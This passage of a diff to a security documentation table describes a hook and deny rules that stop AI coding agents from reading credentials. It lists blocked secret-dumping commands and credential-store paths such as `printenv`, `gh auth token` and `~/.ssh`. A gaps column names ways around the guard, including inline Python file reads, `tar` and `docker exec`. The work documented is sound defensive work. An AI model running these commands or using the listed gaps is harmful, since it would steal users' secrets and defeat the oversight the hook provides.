 | Project `.claude/settings.json` deny rules | Claude's Read/Edit tools on the listed paths (including both Hugging Face token files at their default location, and since 2026-09-27 the [home and tool credential stores](#home-and-tool-credential-stores-2026-09-27)); `printenv`, `env`, `gh auth token`, `hf auth token`, `git credential fill`, `gh auth git-credential`; through the `**/` twins, Context Mode's `ctx_execute_file` and `ctx_index` on the same paths | Python or other subprocesses that open the files themselves, including code run by Context Mode's `ctx_execute` or `ctx_batch_execute` that opens a file directly; forms that do not match the rule text; a moved `HF_HOME`; sessions started outside this repository |
-| `scripts/hooks/secret_path_guard.py` (PreToolUse, Bash; project settings and, through the profile installer, user settings) | commands that name a store path (the Hugging Face token files also as `$HF_HOME/...` or `$XDG_CACHE_HOME/huggingface/...`); read or copy the whole Hugging Face home; read `/proc/*/environ` in any spelling; dump the environment; reference a secret variable; trace a process; print a native token (`gh auth token`, `hf auth token`, `huggingface-cli ... token`, `--show-token`, and the credential-helper forms `git credential fill`, `git credential-<helper> get`, `gh auth git-credential` that `gh auth setup-git` enables); run a reader (`cat`, `sed`, `awk`, `jq`, ...), copy (`cp`, `scp`, `rsync`) or search (`grep`, `rg`, `ag`, `ack`, `git grep`, `find -exec` with a reader) on a pointer variable such as `$HF_TOKEN_PATH`, a `.env`/`*.env` file, a secret variable **name**, or any path the template's credential-store `Read` denies cover: anything in `~/.ssh`, `~/.gnupg`, `~/.aws`, `~/.azure`, `~/.kube`, an OmniRoute data directory, a `shell_snapshots` directory or the OpenHands runtime-worker `runtime-workers/openhands/secrets` directory, each directory and a glob in it, the Docker home, the Docker, git-credential, netrc, npm and PyPI files, and `nativestack/*.key` ([2026-09-27](#home-and-tool-credential-stores-2026-09-27), which on an RTK host is what stops `cat` of them); redirect a pointer variable such as `$HF_TOKEN_PATH` into a command (`<`, `<<<`, `<>`); turn on shell tracing or verbose mode (`bash -x`, `sh -x`, `set -x`, `set -v`, `set -o xtrace`) in a command that sources a credential file; dump the environment (`env`, `printenv`, `export -p`, `declare -p/-x`, inline `os.environ`) after sourcing one; for the kernel keyring ([Guard coverage](#guard-coverage-2026-09-26)), read a payload (`keyctl print`, `pipe`, `read`, `dh_compute`, `list` or `rlist` on anything but an unambiguous keyring, or a keyring read in inline interpreter code), print part of the Tavily key (`tvly auth` without `--json`), or give `kernel_keyring.py exec` or `tvly-keyring` a command that breaks any rule above, names the injected variable or dumps the environment it inherits, also behind a launcher; each text rule also reads the command after quote removal, and every rule reads the command an `rtk` invocation runs ([2026-09-27](#home-and-tool-credential-stores-2026-09-27)) | any Context Mode `ctx_*` call (an MCP tool: the hook is registered for `Bash`, and the guard passes every other tool), a program that imports a loader and prints the result (including `huggingface_hub.get_token()`), an inline interpreter that opens `$HF_TOKEN_PATH` itself (for example `python3 -c "...open(os.environ['HF_TOKEN_PATH'])..."`, which never spells a literal `$HF_TOKEN_PATH`), an archiver such as `tar` on the Hugging Face home, a recursive read or copy of an ancestor directory (`~`, `$HOME`, `~/.cache`, or `$XDG_CACHE_HOME` with a trailing `/` or `/*`) that reaches the Hugging Face home without naming it, a relative read after `cd` into the Hugging Face home, `$HF_HOME/.`, the credential-store gaps recorded under [2026-09-27](#home-and-tool-credential-stores-2026-09-27) (an archiver, a copy or search of `~/.config`, `~/.codex`, `~/.claude` or the runtime-worker state directory, a client that prints its own store, an OmniRoute `DATA_DIR` elsewhere, and `docker exec` into the OpenHands agent-server or a full `docker inspect` of it, which show its session key), obfuscated or renamed paths, a script file that sources and traces on its own, a shell or interpreter started by `exec` that reads its commands from a pipe or a script file, a renamed copy of `kernel_keyring.py`, a variable name assembled at run time, a launcher that takes its command as one string (`script -c`), the macOS `secret run NAME -- command` form, and anything else that is not literal text in the command |
+| `scripts/hooks/secret_path_guard.py` (PreToolUse, Bash; project settings and, through the profile installer, user settings) | commands that name a store path (the Hugging Face token files also as `$HF_HOME/...` or `$XDG_CACHE_HOME/huggingface/...`); read or copy the whole Hugging Face home; read `/proc/*/environ` in any spelling; dump the environment; reference a secret variable; trace a process; print a native token (`gh auth token`, `hf auth token`, `huggingface-cli ... token`, `--show-token`, and the credential-helper forms `git credential fill`, `git credential-<helper> get`, `gh auth git-credential` that `gh auth setup-git` enables); run a reader (`cat`, `sed`, `awk`, `jq`, ...), copy (`cp`, `scp`, `rsync`) or search (`grep`, `rg`, `ag`, `ack`, `git grep`, `find -exec` with a reader) on a pointer variable such as `$HF_TOKEN_PATH`, a `.env`/`*.env` file, a secret variable **name**, or any path the template's credential-store `Read` denies cover: anything in `~/.ssh`, `~/.gnupg`, `~/.aws`, `~/.azure`, `~/.kube`, an OmniRoute data directory, a `shell_snapshots` directory or the OpenHands runtime-worker `runtime-workers/openhands/secrets` directory, each directory and a glob in it, the Docker home, the Docker, git-credential, netrc, npm and PyPI files, and `nativestack/*.key` ([2026-09-27](#home-and-tool-credential-stores-2026-09-27), which on an RTK host is what stops `cat` of them); redirect a pointer variable such as `$HF_TOKEN_PATH` into a command (`<`, `<<<`, `<>`); turn on shell tracing or verbose mode (`bash -x`, `sh -x`, `set -x`, `set -v`, `set -o xtrace`) in a command that sources a credential file; dump the environment (`env`, `printenv`, `export -p`, `declare -p/-x`, inline `os.environ`) after sourcing one; for the kernel keyring ([Guard coverage](#guard-coverage-2026-09-26)), read a payload (`keyctl print`, `pipe`, `read`, `dh_compute`, `list` or `rlist` on anything but an unambiguous keyring, or a keyring read in inline interpreter code), print part of the Tavily key (`tvly auth` without `--json`), or give `kernel_keyring.py exec` or `tvly-keyring` a command that breaks any rule above, names the injected variable or dumps the environment it inherits, also behind a launcher; each text rule also reads the command after quote removal, and every rule reads the command an `rtk` invocation runs ([2026-09-27](#home-and-tool-credential-stores-2026-09-27)) or a `systemd-run` starts, and so does the body of a command substitution inside double quotes (`echo "$(printenv)"`), and `ps -E` or a dashless `ps` cluster with a capital `E` is an environment dump like `ps e`, and so is `systemctl show-environment`, a service manager's whole environment block; a secret variable set through `systemd-run`'s `-E`, `--setenv` or `-p Environment=` is blocked ([2026-09-29](#launchers-substitutions-and-manager-environments-2026-09-29)) | any Context Mode `ctx_*` call (an MCP tool: the hook is registered for `Bash`, and the guard passes every other tool), a program that imports a loader and prints the result (including `huggingface_hub.get_token()`), an inline interpreter that opens `$HF_TOKEN_PATH` itself (for example `python3 -c "...open(os.environ['HF_TOKEN_PATH'])..."`, which never spells a literal `$HF_TOKEN_PATH`), an archiver such as `tar` on the Hugging Face home, a recursive read or copy of an ancestor directory (`~`, `$HOME`, `~/.cache`, or `$XDG_CACHE_HOME` with a trailing `/` or `/*`) that reaches the Hugging Face home without naming it, a relative read after `cd` into the Hugging Face home, `$HF_HOME/.`, the credential-store gaps recorded under [2026-09-27](#home-and-tool-credential-stores-2026-09-27) (an archiver, a copy or search of `~/.config`, `~/.codex`, `~/.claude` or the runtime-worker state directory, a client that prints its own store, an OmniRoute `DATA_DIR` elsewhere, and `docker exec` into the OpenHands agent-server or a full `docker inspect` of it, which show its session key), obfuscated or renamed paths, a script file that sources and traces on its own, a shell or interpreter started by `exec` that reads its commands from a pipe or a script file, a renamed copy of `kernel_keyring.py`, a variable name assembled at run time, a launcher that takes its command as one string (`script -c`), the macOS `secret run NAME -- command` form, and anything else that is not literal text in the command |
 | Codex `[shell_environment_policy] inherit = "none"` | credential and broker variables in the launcher environment reaching Codex shells (measured, see below) | file reads. The setting controls which environment variables a Codex shell inherits, not which files it can open. A Codex shell can still `cat` a store file. The file-level mitigations are the store's location outside every workspace and the Codex sandbox; Codex 0.155.1 has no documented per-path read deny |
 
 In plain terms: an agent running as your user in `bypassPermissions` mode can
